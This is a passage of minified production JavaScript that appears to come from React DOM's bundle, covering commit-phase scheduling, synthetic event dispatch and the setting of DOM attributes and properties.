				(oa = t),
				(ne = l),
				(ra = e),
				(xi = n),
				(bi = u),
				($o = a),
				(t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0
					? ((l.callbackNode = null),
					  (l.callbackPriority = 0),
					  Lm(Su, function () {
							return rr(), null;
					  }))
					: ((l.callbackNode = null), (l.callbackPriority = 0)),
				(a = (t.flags & 13878) !== 0),
				(t.subtreeFlags & 13878) !== 0 || a)
			) {
				(a = b.T),
					(b.T = null),
					(u = A.p),
					(A.p = 2),
					(c = al),
					(al |= 4);
				try {
					Um(l, t, e);
				} finally {
					(al = c), (A.p = u), (b.T = a);
				}
			}
			(Dl = 1), ir(), fr(), sr();
		}
	}
	function ir() {
		if (Dl === 1) {
			Dl = 0;
			var l = ne,
				t = oa,
				e = (t.flags & 13878) !== 0;
			if ((t.subtreeFlags & 13878) !== 0 || e) {
				(e = b.T), (b.T = null);
				var a = A.p;
				A.p = 2;
				var u = al;
				al |= 4;
				try {
					Zo(t, l);
					var n = Hi,
						c = kf(l.containerInfo),
						i = n.focusedElem,
						s = n.selectionRange;
					if (
						c !== i &&
						i &&
						i.ownerDocument &&
						Jf(i.ownerDocument.documentElement, i)
					) {
						if (s !== null && fc(i)) {
							var v = s.start,
								x = s.end;
							if (
								(x === void 0 && (x = v), "selectionStart" in i)
							)
								(i.selectionStart = v),
									(i.selectionEnd = Math.min(
										x,
										i.value.length
									));
							else {
								var p = i.ownerDocument || document,
									g = (p && p.defaultView) || window;
								if (g.getSelection) {
									var y = g.getSelection(),
										Y = i.textContent.length,
										w = Math.min(s.start, Y),
										il =
											s.end === void 0
												? w
												: Math.min(s.end, Y);
									!y.extend &&
										w > il &&
										((c = il), (il = w), (w = c));
									var d = Kf(i, w),
										r = Kf(i, il);
									if (
										d &&
										r &&
										(y.rangeCount !== 1 ||
											y.anchorNode !== d.node ||
											y.anchorOffset !== d.offset ||
											y.focusNode !== r.node ||
											y.focusOffset !== r.offset)
									) {
										var m = p.createRange();
										m.setStart(d.node, d.offset),
											y.removeAllRanges(),
											w > il
												? (y.addRange(m),
												  y.extend(r.node, r.offset))
												: (m.setEnd(r.node, r.offset),
												  y.addRange(m));
									}
								}
							}
						}
						for (p = [], y = i; (y = y.parentNode); )
							y.nodeType === 1 &&
								p.push({
									element: y,
									left: y.scrollLeft,
									top: y.scrollTop,
								});
						for (
							typeof i.focus == "function" && i.focus(), i = 0;
							i < p.length;
							i++
						) {
							var S = p[i];
							(S.element.scrollLeft = S.left),
								(S.element.scrollTop = S.top);
						}
					}
					(Mn = !!wi), (Hi = wi = null);
				} finally {
					(al = u), (A.p = a), (b.T = e);
				}
			}
			(l.current = t), (Dl = 2);
		}
	}
	function fr() {
		if (Dl === 2) {
			Dl = 0;
			var l = ne,
				t = oa,
				e = (t.flags & 8772) !== 0;
			if ((t.subtreeFlags & 8772) !== 0 || e) {
				(e = b.T), (b.T = null);
				var a = A.p;
				A.p = 2;
				var u = al;
				al |= 4;
				try {
					Yo(l, t.alternate, t);
				} finally {
					(al = u), (A.p = a), (b.T = e);
				}
			}
			Dl = 3;
		}
	}
	function sr() {
		if (Dl === 4 || Dl === 3) {
			(Dl = 0), sd();
			var l = ne,
				t = oa,
				e = ra,
				a = $o;
			(t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0
				? (Dl = 5)
				: ((Dl = 0), (oa = ne = null), or(l, l.pendingLanes));
			var u = l.pendingLanes;
			if (
				(u === 0 && (ue = null),
				Xn(e),
				(t = t.stateNode),
				Wl && typeof Wl.onCommitFiberRoot == "function")
			)
				try {
					Wl.onCommitFiberRoot(
						ba,
						t,
						void 0,
						(t.current.flags & 128) === 128
					);
				} catch {}
			if (a !== null) {
				(t = b.T), (u = A.p), (A.p = 2), (b.T = null);
				try {
					for (
						var n = l.onRecoverableError, c = 0;
						c < a.length;
						c++
					) {
						var i = a[c];
						n(i.value, { componentStack: i.stack });
					}
				} finally {
					(b.T = t), (A.p = u);
				}
			}
			(ra & 3) !== 0 && gn(),
				Et(l),
				(u = l.pendingLanes),
				(e & 4194090) !== 0 && (u & 42) !== 0
					? l === Si
						? au++
						: ((au = 0), (Si = l))
					: (au = 0),
				uu(0);
		}
	}
	function or(l, t) {
		(l.pooledCacheLanes &= t) === 0 &&
			((t = l.pooledCache), t != null && ((l.pooledCache = null), qa(t)));
	}
	function gn(l) {
		return ir(), fr(), sr(), rr();
	}
	function rr() {
		if (Dl !== 5) return !1;
		var l = ne,
			t = xi;
		xi = 0;
		var e = Xn(ra),
			a = b.T,
			u = A.p;
		try {
			(A.p = 32 > e ? 32 : e), (b.T = null), (e = bi), (bi = null);
			var n = ne,
				c = ra;
			if (((Dl = 0), (oa = ne = null), (ra = 0), (al & 6) !== 0))
				throw Error(h(331));
			var i = al;
			if (
				((al |= 4),
				ko(n.current),
				Vo(n, n.current, c, e),
				(al = i),
				uu(0, !1),
				Wl && typeof Wl.onPostCommitFiberRoot == "function")
			)
				try {
					Wl.onPostCommitFiberRoot(ba, n);
				} catch {}
			return !0;
		} finally {
			(A.p = u), (b.T = a), or(l, t);
		}
	}
	function dr(l, t, e) {
		(t = ct(e, t)),
			(t = Ic(l.stateNode, t, 2)),
			(l = Wt(l, t, 2)),
			l !== null && (pa(l, 2), Et(l));
	}
	function sl(l, t, e) {
		if (l.tag === 3) dr(l, l, e);
		else
			for (; t !== null; ) {
				if (t.tag === 3) {
					dr(t, l, e);
					break;
				} else if (t.tag === 1) {
					var a = t.stateNode;
					if (
						typeof t.type.getDerivedStateFromError == "function" ||
						(typeof a.componentDidCatch == "function" &&
							(ue === null || !ue.has(a)))
					) {
						(l = ct(e, l)),
							(e = go(2)),
							(a = Wt(t, e, 2)),
							a !== null && (yo(e, a, t, l), pa(a, 2), Et(a));
						break;
					}
				}
				t = t.return;
			}
	}
	function Ti(l, t, e) {
		var a = l.pingCache;
		if (a === null) {
			a = l.pingCache = new Bm();
			var u = new Set();
			a.set(t, u);
		} else (u = a.get(t)), u === void 0 && ((u = new Set()), a.set(t, u));
		u.has(e) ||
			((hi = !0), u.add(e), (l = Xm.bind(null, l, t, e)), t.then(l, l));
	}
	function Xm(l, t, e) {
		var a = l.pingCache;
		a !== null && a.delete(t),
			(l.pingedLanes |= l.suspendedLanes & e),
			(l.warmLanes &= ~e),
			rl === l &&
				(W & e) === e &&
				(xl === 4 ||
				(xl === 3 && (W & 62914560) === W && 300 > St() - yi)
					? (al & 2) === 0 && da(l, 0)
					: (vi |= e),
				sa === W && (sa = 0)),
			Et(l);
	}
	function mr(l, t) {
		t === 0 && (t = ff()), (l = ke(l, t)), l !== null && (pa(l, t), Et(l));
	}
	function Qm(l) {
		var t = l.memoizedState,
			e = 0;
		t !== null && (e = t.retryLane), mr(l, e);
	}
	function Zm(l, t) {
		var e = 0;
		switch (l.tag) {
			case 13:
				var a = l.stateNode,
					u = l.memoizedState;
				u !== null && (e = u.retryLane);
				break;
			case 19:
				a = l.stateNode;
				break;
			case 22:
				a = l.stateNode._retryCache;
				break;
			default:
				throw Error(h(314));
		}
		a !== null && a.delete(t), mr(l, e);
	}
	function Lm(l, t) {
		return qn(l, t);
	}
	var yn = null,
		ha = null,
		Ei = !1,
		xn = !1,
		Ai = !1,
		Re = 0;
	function Et(l) {
		l !== ha &&
			l.next === null &&
			(ha === null ? (yn = ha = l) : (ha = ha.next = l)),
			(xn = !0),
			Ei || ((Ei = !0), Km());
	}
	function uu(l, t) {
		if (!Ai && xn) {
			Ai = !0;
			do
				for (var e = !1, a = yn; a !== null; ) {
					if (l !== 0) {
						var u = a.pendingLanes;
						if (u === 0) var n = 0;
						else {
							var c = a.suspendedLanes,
								i = a.pingedLanes;
							(n = (1 << (31 - $l(42 | l) + 1)) - 1),
								(n &= u & ~(c & ~i)),
								(n =
									n & 201326741
										? (n & 201326741) | 1
										: n
										? n | 2
										: 0);
						}
						n !== 0 && ((e = !0), yr(a, n));
					} else
						(n = W),
							(n = ju(
								a,
								a === rl ? n : 0,
								a.cancelPendingCommit !== null ||
									a.timeoutHandle !== -1
							)),
							(n & 3) === 0 || Sa(a, n) || ((e = !0), yr(a, n));
					a = a.next;
				}
			while (e);
			Ai = !1;
		}
	}
	function Vm() {
		hr();
	}
	function hr() {
		xn = Ei = !1;
		var l = 0;
		Re !== 0 && (lh() && (l = Re), (Re = 0));
		for (var t = St(), e = null, a = yn; a !== null; ) {
			var u = a.next,
				n = vr(a, t);
			n === 0
				? ((a.next = null),
				  e === null ? (yn = u) : (e.next = u),
				  u === null && (ha = e))
				: ((e = a), (l !== 0 || (n & 3) !== 0) && (xn = !0)),
				(a = u);
		}
		uu(l);
	}
	function vr(l, t) {
		for (
			var e = l.suspendedLanes,
				a = l.pingedLanes,
				u = l.expirationTimes,
				n = l.pendingLanes & -62914561;
			0 < n;

		) {
			var c = 31 - $l(n),
				i = 1 << c,
				s = u[c];
			s === -1
				? ((i & e) === 0 || (i & a) !== 0) && (u[c] = yd(i, t))
				: s <= t && (l.expiredLanes |= i),
				(n &= ~i);
		}
		if (
			((t = rl),
			(e = W),
			(e = ju(
				l,
				l === t ? e : 0,
				l.cancelPendingCommit !== null || l.timeoutHandle !== -1
			)),
			(a = l.callbackNode),
			e === 0 ||
				(l === t && (ul === 2 || ul === 9)) ||
				l.cancelPendingCommit !== null)
		)
			return (
				a !== null && a !== null && Cn(a),
				(l.callbackNode = null),
				(l.callbackPriority = 0)
			);
		if ((e & 3) === 0 || Sa(l, e)) {
			if (((t = e & -e), t === l.callbackPriority)) return t;
			switch ((a !== null && Cn(a), Xn(e))) {
				case 2:
				case 8:
					e = uf;
					break;
				case 32:
					e = Su;
					break;
				case 268435456:
					e = nf;
					break;
				default:
					e = Su;
			}
			return (
				(a = gr.bind(null, l)),
				(e = qn(e, a)),
				(l.callbackPriority = t),
				(l.callbackNode = e),
				t
			);
		}
		return (
			a !== null && a !== null && Cn(a),
			(l.callbackPriority = 2),
			(l.callbackNode = null),
			2
		);
	}
	function gr(l, t) {
		if (Dl !== 0 && Dl !== 5)
			return (l.callbackNode = null), (l.callbackPriority = 0), null;
		var e = l.callbackNode;
		if (gn() && l.callbackNode !== e) return null;
		var a = W;
		return (
			(a = ju(
				l,
				l === rl ? a : 0,
				l.cancelPendingCommit !== null || l.timeoutHandle !== -1
			)),
			a === 0
				? null
				: (Io(l, a, t),
				  vr(l, St()),
				  l.callbackNode != null && l.callbackNode === e
						? gr.bind(null, l)
						: null)
		);
	}
	function yr(l, t) {
		if (gn()) return null;
		Io(l, t, !0);
	}
	function Km() {
		eh(function () {
			(al & 6) !== 0 ? qn(af, Vm) : hr();
		});
	}
	function zi() {
		return Re === 0 && (Re = cf()), Re;
	}
	function xr(l) {
		return l == null || typeof l == "symbol" || typeof l == "boolean"
			? null
			: typeof l == "function"
			? l
			: Mu("" + l);
	}
	function br(l, t) {
		var e = t.ownerDocument.createElement("input");
		return (
			(e.name = t.name),
			(e.value = t.value),
			l.id && e.setAttribute("form", l.id),
			t.parentNode.insertBefore(e, t),
			(l = new FormData(l)),
			e.parentNode.removeChild(e),
			l
		);
	}
	function Jm(l, t, e, a, u) {
		if (t === "submit" && e && e.stateNode === u) {
			var n = xr((u[Gl] || null).action),
				c = a.submitter;
			c &&
				((t = (t = c[Gl] || null)
					? xr(t.formAction)
					: c.getAttribute("formAction")),
				t !== null && ((n = t), (c = null)));
			var i = new Ru("action", "action", null, a, u);
			l.push({
				event: i,
				listeners: [
					{
						instance: null,
						listener: function () {
							if (a.defaultPrevented) {
								if (Re !== 0) {
									var s = c ? br(u, c) : new FormData(u);
									Jc(
										e,
										{
											pending: !0,
											data: s,
											method: u.method,
											action: n,
										},
										null,
										s
									);
								}
							} else
								typeof n == "function" &&
									(i.preventDefault(),
									(s = c ? br(u, c) : new FormData(u)),
									Jc(
										e,
										{
											pending: !0,
											data: s,
											method: u.method,
											action: n,
										},
										n,
										s
									));
						},
						currentTarget: u,
					},
				],
			});
		}
	}
	for (var Mi = 0; Mi < dc.length; Mi++) {
		var Oi = dc[Mi],
			km = Oi.toLowerCase(),
			Wm = Oi[0].toUpperCase() + Oi.slice(1);
		vt(km, "on" + Wm);
	}
	vt(Ff, "onAnimationEnd"),
		vt(If, "onAnimationIteration"),
		vt(Pf, "onAnimationStart"),
		vt("dblclick", "onDoubleClick"),
		vt("focusin", "onFocus"),
		vt("focusout", "onBlur"),
		vt(dm, "onTransitionRun"),
		vt(mm, "onTransitionStart"),
		vt(hm, "onTransitionCancel"),
		vt(ls, "onTransitionEnd"),
		Ce("onMouseEnter", ["mouseout", "mouseover"]),
		Ce("onMouseLeave", ["mouseout", "mouseover"]),
		Ce("onPointerEnter", ["pointerout", "pointerover"]),
		Ce("onPointerLeave", ["pointerout", "pointerover"]),
		ge(
			"onChange",
			"change click focusin focusout input keydown keyup selectionchange".split(
				" "
			)
		),
		ge(
			"onSelect",
			"focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
				" "
			)
		),
		ge("onBeforeInput", [
			"compositionend",
			"keypress",
			"textInput",
			"paste",
		]),
		ge(
			"onCompositionEnd",
			"compositionend focusout keydown keypress keyup mousedown".split(
				" "
			)
		),
		ge(
			"onCompositionStart",
			"compositionstart focusout keydown keypress keyup mousedown".split(
				" "
			)
		),
		ge(
			"onCompositionUpdate",
			"compositionupdate focusout keydown keypress keyup mousedown".split(
				" "
			)
		);
	var nu =
			"abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
				" "
			),
		$m = new Set(
			"beforetoggle cancel close invalid load scroll scrollend toggle"
				.split(" ")
				.concat(nu)
		);
	function Sr(l, t) {
		t = (t & 4) !== 0;
		for (var e = 0; e < l.length; e++) {
			var a = l[e],
				u = a.event;
			a = a.listeners;
			l: {
				var n = void 0;
				if (t)
					for (var c = a.length - 1; 0 <= c; c--) {
						var i = a[c],
							s = i.instance,
							v = i.currentTarget;
						if (
							((i = i.listener),
							s !== n && u.isPropagationStopped())
						)
							break l;
						(n = i), (u.currentTarget = v);
						try {
							n(u);
						} catch (x) {
							un(x);
						}
						(u.currentTarget = null), (n = s);
					}
				else
					for (c = 0; c < a.length; c++) {
						if (
							((i = a[c]),
							(s = i.instance),
							(v = i.currentTarget),
							(i = i.listener),
							s !== n && u.isPropagationStopped())
						)
							break l;
						(n = i), (u.currentTarget = v);
						try {
							n(u);
						} catch (x) {
							un(x);
						}
						(u.currentTarget = null), (n = s);
					}
			}
		}
	}
	function K(l, t) {
		var e = t[Qn];
		e === void 0 && (e = t[Qn] = new Set());
		var a = l + "__bubble";
		e.has(a) || (pr(t, l, 2, !1), e.add(a));
	}
	function _i(l, t, e) {
		var a = 0;
		t && (a |= 4), pr(e, l, a, t);
	}
	var bn = "_reactListening" + Math.random().toString(36).slice(2);
	function Di(l) {
		if (!l[bn]) {
			(l[bn] = !0),
				mf.forEach(function (e) {
					e !== "selectionchange" &&
						($m.has(e) || _i(e, !1, l), _i(e, !0, l));
				});
			var t = l.nodeType === 9 ? l : l.ownerDocument;
			t === null || t[bn] || ((t[bn] = !0), _i("selectionchange", !1, t));
		}
	}
	function pr(l, t, e, a) {
		switch (Vr(t)) {
			case 2:
				var u = jh;
				break;
			case 8:
				u = Th;
				break;
			default:
				u = Vi;
		}
		(e = u.bind(null, t, e, l)),
			(u = void 0),
			!Pn ||
				(t !== "touchstart" && t !== "touchmove" && t !== "wheel") ||
				(u = !0),
			a
				? u !== void 0
					? l.addEventListener(t, e, { capture: !0, passive: u })
					: l.addEventListener(t, e, !0)
				: u !== void 0
				? l.addEventListener(t, e, { passive: u })
				: l.addEventListener(t, e, !1);
	}
	function Ri(l, t, e, a, u) {
		var n = a;
		if ((t & 1) === 0 && (t & 2) === 0 && a !== null)
			l: for (;;) {
				if (a === null) return;
				var c = a.tag;
				if (c === 3 || c === 4) {
					var i = a.stateNode.containerInfo;
					if (i === u) break;
					if (c === 4)
						for (c = a.return; c !== null; ) {
							var s = c.tag;
							if (
								(s === 3 || s === 4) &&
								c.stateNode.containerInfo === u
							)
								return;
							c = c.return;
						}
					for (; i !== null; ) {
						if (((c = He(i)), c === null)) return;
						if (
							((s = c.tag),
							s === 5 || s === 6 || s === 26 || s === 27)
						) {
							a = n = c;
							continue l;
						}
						i = i.parentNode;
					}
				}
				a = a.return;
			}
		zf(function () {
			var v = n,
				x = Fn(e),
				p = [];
			l: {
				var g = ts.get(l);
				if (g !== void 0) {
					var y = Ru,
						Y = l;
					switch (l) {
						case "keypress":
							if (_u(e) === 0) break l;
						case "keydown":
						case "keyup":
							y = Ld;
							break;
						case "focusin":
							(Y = "focus"), (y = ac);
							break;
						case "focusout":
							(Y = "blur"), (y = ac);
							break;
						case "beforeblur":
						case "afterblur":
							y = ac;
							break;
						case "click":
							if (e.button === 2) break l;
						case "auxclick":
						case "dblclick":
						case "mousedown":
						case "mousemove":
						case "mouseup":
						case "mouseout":
						case "mouseover":
						case "contextmenu":
							y = _f;
							break;
						case "drag":
						case "dragend":
						case "dragenter":
						case "dragexit":
						case "dragleave":
						case "dragover":
						case "dragstart":
						case "drop":
							y = Rd;
							break;
						case "touchcancel":
						case "touchend":
						case "touchmove":
						case "touchstart":
							y = Jd;
							break;
						case Ff:
						case If:
						case Pf:
							y = Hd;
							break;
						case ls:
							y = Wd;
							break;
						case "scroll":
						case "scrollend":
							y = _d;
							break;
						case "wheel":
							y = Fd;
							break;
						case "copy":
						case "cut":
						case "paste":
							y = qd;
							break;
						case "gotpointercapture":
						case "lostpointercapture":
						case "pointercancel":
						case "pointerdown":
						case "pointermove":
						case "pointerout":
						case "pointerover":
						case "pointerup":
							y = Rf;
							break;
						case "toggle":
						case "beforetoggle":
							y = Pd;
					}
					var w = (t & 4) !== 0,
						il = !w && (l === "scroll" || l === "scrollend"),
						d = w ? (g !== null ? g + "Capture" : null) : g;
					w = [];
					for (var r = v, m; r !== null; ) {
						var S = r;
						if (
							((m = S.stateNode),
							(S = S.tag),
							(S !== 5 && S !== 26 && S !== 27) ||
								m === null ||
								d === null ||
								((S = Ta(r, d)),
								S != null && w.push(cu(r, S, m))),
							il)
						)
							break;
						r = r.return;
					}
					0 < w.length &&
						((g = new y(g, Y, null, e, x)),
						p.push({ event: g, listeners: w }));
				}
			}
			if ((t & 7) === 0) {
				l: {
					if (
						((g = l === "mouseover" || l === "pointerover"),
						(y = l === "mouseout" || l === "pointerout"),
						g &&
							e !== $n &&
							(Y = e.relatedTarget || e.fromElement) &&
							(He(Y) || Y[we]))
					)
						break l;
					if (
						(y || g) &&
						((g =
							x.window === x
								? x
								: (g = x.ownerDocument)
								? g.defaultView || g.parentWindow
								: window),
						y
							? ((Y = e.relatedTarget || e.toElement),
							  (y = v),
							  (Y = Y ? He(Y) : null),
							  Y !== null &&
									((il = q(Y)),
									(w = Y.tag),
									Y !== il ||
										(w !== 5 && w !== 27 && w !== 6)) &&
									(Y = null))
							: ((y = null), (Y = v)),
						y !== Y)
					) {
						if (
							((w = _f),
							(S = "onMouseLeave"),
							(d = "onMouseEnter"),
							(r = "mouse"),
							(l === "pointerout" || l === "pointerover") &&
								((w = Rf),
								(S = "onPointerLeave"),
								(d = "onPointerEnter"),
								(r = "pointer")),
							(il = y == null ? g : ja(y)),
							(m = Y == null ? g : ja(Y)),
							(g = new w(S, r + "leave", y, e, x)),
							(g.target = il),
							(g.relatedTarget = m),
							(S = null),
							He(x) === v &&
								((w = new w(d, r + "enter", Y, e, x)),
								(w.target = m),
								(w.relatedTarget = il),
								(S = w)),
							(il = S),
							y && Y)
						)
							t: {
								for (w = y, d = Y, r = 0, m = w; m; m = va(m))
									r++;
								for (m = 0, S = d; S; S = va(S)) m++;
								for (; 0 < r - m; ) (w = va(w)), r--;
								for (; 0 < m - r; ) (d = va(d)), m--;
								for (; r--; ) {
									if (
										w === d ||
										(d !== null && w === d.alternate)
									)
										break t;
									(w = va(w)), (d = va(d));
								}
								w = null;
							}
						else w = null;
						y !== null && Nr(p, g, y, w, !1),
							Y !== null && il !== null && Nr(p, il, Y, w, !0);
					}
				}
				l: {
					if (
						((g = v ? ja(v) : window),
						(y = g.nodeName && g.nodeName.toLowerCase()),
						y === "select" || (y === "input" && g.type === "file"))
					)
						var O = Gf;
					else if (Cf(g))
						if (Xf) O = sm;
						else {
							O = im;
							var L = cm;
						}
					else
						(y = g.nodeName),
							!y ||
							y.toLowerCase() !== "input" ||
							(g.type !== "checkbox" && g.type !== "radio")
								? v && Wn(v.elementType) && (O = Gf)
								: (O = fm);
					if (O && (O = O(l, v))) {
						Yf(p, O, e, x);
						break l;
					}
					L && L(l, g, v),
						l === "focusout" &&
							v &&
							g.type === "number" &&
							v.memoizedProps.value != null &&
							kn(g, "number", g.value);
				}
				switch (((L = v ? ja(v) : window), l)) {
					case "focusin":
						(Cf(L) || L.contentEditable === "true") &&
							((Ve = L), (sc = v), (Ra = null));
						break;
					case "focusout":
						Ra = sc = Ve = null;
						break;
					case "mousedown":
						oc = !0;
						break;
					case "contextmenu":
					case "mouseup":
					case "dragend":
						(oc = !1), Wf(p, e, x);
						break;
					case "selectionchange":
						if (rm) break;
					case "keydown":
					case "keyup":
						Wf(p, e, x);
				}
				var R;
				if (nc)
					l: {
						switch (l) {
							case "compositionstart":
								var B = "onCompositionStart";
								break l;
							case "compositionend":
								B = "onCompositionEnd";
								break l;
							case "compositionupdate":
								B = "onCompositionUpdate";
								break l;
						}
						B = void 0;
					}
				else
					Le
						? Bf(l, e) && (B = "onCompositionEnd")
						: l === "keydown" &&
						  e.keyCode === 229 &&
						  (B = "onCompositionStart");
				B &&
					(Uf &&
						e.locale !== "ko" &&
						(Le || B !== "onCompositionStart"
							? B === "onCompositionEnd" && Le && (R = Mf())
							: ((Vt = x),
							  (lc = "value" in Vt ? Vt.value : Vt.textContent),
							  (Le = !0))),
					(L = Sn(v, B)),
					0 < L.length &&
						((B = new Df(B, l, null, e, x)),
						p.push({ event: B, listeners: L }),
						R
							? (B.data = R)
							: ((R = qf(e)), R !== null && (B.data = R)))),
					(R = tm ? em(l, e) : am(l, e)) &&
						((B = Sn(v, "onBeforeInput")),
						0 < B.length &&
							((L = new Df(
								"onBeforeInput",
								"beforeinput",
								null,
								e,
								x
							)),
							p.push({ event: L, listeners: B }),
							(L.data = R))),
					Jm(p, l, v, e, x);
			}
			Sr(p, t);
		});
	}
	function cu(l, t, e) {
		return { instance: l, listener: t, currentTarget: e };
	}
	function Sn(l, t) {
		for (var e = t + "Capture", a = []; l !== null; ) {
			var u = l,
				n = u.stateNode;
			if (
				((u = u.tag),
				(u !== 5 && u !== 26 && u !== 27) ||
					n === null ||
					((u = Ta(l, e)),
					u != null && a.unshift(cu(l, u, n)),
					(u = Ta(l, t)),
					u != null && a.push(cu(l, u, n))),
				l.tag === 3)
			)
				return a;
			l = l.return;
		}
		return [];
	}
	function va(l) {
		if (l === null) return null;
		do l = l.return;
		while (l && l.tag !== 5 && l.tag !== 27);
		return l || null;
	}
	function Nr(l, t, e, a, u) {
		for (var n = t._reactName, c = []; e !== null && e !== a; ) {
			var i = e,
				s = i.alternate,
				v = i.stateNode;
			if (((i = i.tag), s !== null && s === a)) break;
			(i !== 5 && i !== 26 && i !== 27) ||
				v === null ||
				((s = v),
				u
					? ((v = Ta(e, n)), v != null && c.unshift(cu(e, v, s)))
					: u || ((v = Ta(e, n)), v != null && c.push(cu(e, v, s)))),
				(e = e.return);
		}
		c.length !== 0 && l.push({ event: t, listeners: c });
	}
	var Fm = /\r\n?/g,
		Im = /\u0000|\uFFFD/g;
	function jr(l) {
		return (typeof l == "string" ? l : "" + l)
			.replace(
				Fm,
				`
`
			)
			.replace(Im, "");
	}
	function Tr(l, t) {
		return (t = jr(t)), jr(l) === t;
	}
	function pn() {}
	function cl(l, t, e, a, u, n) {
		switch (e) {
			case "children":
				typeof a == "string"
					? t === "body" || (t === "textarea" && a === "") || Xe(l, a)
					: (typeof a == "number" || typeof a == "bigint") &&
					  t !== "body" &&
					  Xe(l, "" + a);
				break;
			case "className":
				Eu(l, "class", a);
				break;
			case "tabIndex":
				Eu(l, "tabindex", a);
				break;
			case "dir":
			case "role":
			case "viewBox":
			case "width":
			case "height":
				Eu(l, e, a);
				break;
			case "style":
				Ef(l, a, n);
				break;
			case "data":
				if (t !== "object") {
					Eu(l, "data", a);
					break;
				}
			case "src":
			case "href":
				if (a === "" && (t !== "a" || e !== "href")) {
					l.removeAttribute(e);
					break;
				}
				if (
					a == null ||
					typeof a == "function" ||
					typeof a == "symbol" ||
					typeof a == "boolean"
				) {
					l.removeAttribute(e);
					break;
				}
				(a = Mu("" + a)), l.setAttribute(e, a);
				break;
			case "action":
			case "formAction":
				if (typeof a == "function") {
					l.setAttribute(
						e,
						"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')"
					);
					break;
				} else
					typeof n == "function" &&
						(e === "formAction"
							? (t !== "input" &&
									cl(l, t, "name", u.name, u, null),
							  cl(l, t, "formEncType", u.formEncType, u, null),
							  cl(l, t, "formMethod", u.formMethod, u, null),
							  cl(l, t, "formTarget", u.formTarget, u, null))
							: (cl(l, t, "encType", u.encType, u, null),
							  cl(l, t, "method", u.method, u, null),
							  cl(l, t, "target", u.target, u, null)));
				if (
					a == null ||
					typeof a == "symbol" ||
					typeof a == "boolean"
				) {
					l.removeAttribute(e);
					break;
				}
				(a = Mu("" + a)), l.setAttribute(e, a);
				break;
			case "onClick":
				a != null && (l.onclick = pn);
				break;
			case "onScroll":
				a != null && K("scroll", l);
				break;
			case "onScrollEnd":
				a != null && K("scrollend", l);
				break;
			case "dangerouslySetInnerHTML":
				if (a != null) {
					if (typeof a != "object" || !("__html" in a))
						throw Error(h(61));
					if (((e = a.__html), e != null)) {
						if (u.children != null) throw Error(h(60));
						l.innerHTML = e;
					}
				}
				break;
			case "multiple":
				l.multiple =
					a && typeof a != "function" && typeof a != "symbol";
				break;
			case "muted":
				l.muted = a && typeof a != "function" && typeof a != "symbol";
				break;
			case "suppressContentEditableWarning":
			case "suppressHydrationWarning":
			case "defaultValue":
			case "defaultChecked":
			case "innerHTML":
			case "ref":
				break;
			case "autoFocus":
				break;
			case "xlinkHref":
				if (
					a == null ||
					typeof a == "function" ||
					typeof a == "boolean" ||
					typeof a == "symbol"
				) {
					l.removeAttribute("xlink:href");
					break;
				}
				(e = Mu("" + a)),
					l.setAttributeNS(
						"http://www.w3.org/1999/xlink",
						"xlink:href",
						e
					);
				break;
			case "contentEditable":
			case "spellCheck":
			case "draggable":
			case "value":
			case "autoReverse":
			case "externalResourcesRequired":
			case "focusable":
			case "preserveAlpha":
				a != null && typeof a != "function" && typeof a != "symbol"
					? l.setAttribute(e, "" + a)
					: l.removeAttribute(e);
				break;
			case "inert":
			case "allowFullScreen":
			case "async":
			case "autoPlay":
			case "controls":
			case "default":
			case "defer":
			case "disabled":
			case "disablePictureInPicture":
			case "disableRemotePlayback":
			case "formNoValidate":
			case "hidden":
			case "loop":
			case "noModule":
			case "noValidate":
			case "open":
			case "playsInline":
			case "readOnly":
			case "required":
			case "reversed":
			case "scoped":
			case "seamless":
			case "itemScope":
				a && typeof a != "function" && typeof a != "symbol"
					? l.setAttribute(e, "")
					: l.removeAttribute(e);
				break;
			case "capture":
			case "download":
				a === !0
					? l.setAttribute(e, "")
					: a !== !1 &&
					  a != null &&
					  typeof a != "function" &&
					  typeof a != "symbol"
					? l.setAttribute(e, a)
					: l.removeAttribute(e);
				break;
			case "cols":
			case "rows":
			case "size":
			case "span":
				a != null &&
				typeof a != "function" &&
				typeof a != "symbol" &&
				!isNaN(a) &&
				1 <= a
					? l.setAttribute(e, a)
					: l.removeAttribute(e);
				break;
			case "rowSpan":
			case "start":
				a == null ||
				typeof a == "function" ||
				typeof a == "symbol" ||
				isNaN(a)
					? l.removeAttribute(e)
					: l.setAttribute(e, a);
				break;
			case "popover":
				K("beforetoggle", l), K("toggle", l), Tu(l, "popover", a);
				break;
			case "xlinkActuate":
				zt(l, "http://www.w3.org/1999/xlink", "xlink:actuate", a);
				break;
			case "xlinkArcrole":
				zt(l, "http://www.w3.org/1999/xlink", "xlink:arcrole", a);
				break;
			case "xlinkRole":
				zt(l, "http://www.w3.org/1999/xlink", "xlink:role", a);
				break;
			case "xlinkShow":
				zt(l, "http://www.w3.org/1999/xlink", "xlink:show", a);
				break;
			case "xlinkTitle":
				zt(l, "http://www.w3.org/1999/xlink", "xlink:title", a);
				break;
			case "xlinkType":
				zt(l, "http://www.w3.org/1999/xlink", "xlink:type", a);
				break;
			case "xmlBase":
				zt(l, "http://www.w3.org/XML/1998/namespace", "xml:base", a);
				break;
			case "xmlLang":
				zt(l, "http://www.w3.org/XML/1998/namespace", "xml:lang", a);
				break;
			case "xmlSpace":
				zt(l, "http://www.w3.org/XML/1998/namespace", "xml:space", a);
				break;
			case "is":
				Tu(l, "is", a);
				break;
			case "innerText":
			case "textContent":
				break;
			default:
				(!(2 < e.length) ||
					(e[0] !== "o" && e[0] !== "O") ||
					(e[1] !== "n" && e[1] !== "N")) &&
					((e = Md.get(e) || e), Tu(l, e, a));
		}
	}
	function Ui(l, t, e, a, u, n) {
		switch (e) {
			case "style":
				Ef(l, a, n);
				break;
			case "dangerouslySetInnerHTML":
				if (a != null) {
					if (typeof a != "object" || !("__html" in a))
						throw Error(h(61));
					if (((e = a.__html), e != null)) {
						if (u.children != null) throw Error(h(60));
						l.innerHTML = e;
					}
				}
				break;
			case "children":
				typeof a == "string"
					? Xe(l, a)
					: (typeof a == "number" || typeof a == "bigint") &&
